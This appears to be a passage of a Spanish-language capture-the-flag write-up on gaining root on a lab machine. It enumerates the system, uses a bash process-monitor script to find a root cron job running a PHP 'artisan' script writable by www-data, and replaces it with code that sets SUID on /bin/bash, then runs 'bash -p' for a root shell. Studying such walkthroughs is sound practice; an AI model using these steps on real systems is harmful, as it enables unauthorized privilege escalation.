## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
cd /root
id
sudo -l
uname -a
lsb_release -a
find \-perm -4000 2>/dev/null
```

Aqui no hay nada interesante, vamos a enumerar el systema por tareas cron

```bash
cd /dev/shm
ls
touch procmon.sh
chmod +x procmon.sh
nano procmon.sh
```

```bash
#!/bin/bash

old_process=$(ps -eo command)

while true; do
    new_process=$(ps -eo command)
    diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -v -E "procmon|command"
    old_process=$new_process
done
```

Y lo ejecutamos. Vemos que hay una tarea que ejecuta un script llamado artisan en **php**. Haciendole un `ls -l` nos damos cuenta que
el proprietario del script es **www-data**. Imaginamos que el que lanza el script es root. vamos a modificar el script.

```php
<?php
    system("chmod 4755 /bin/bash");
?>
```

Esperamos que la tarea se ejecute con `watch -n 1 ls -l /bin/bash` y pasa a ser SUID

```bash
bash -p
whoami

root
```

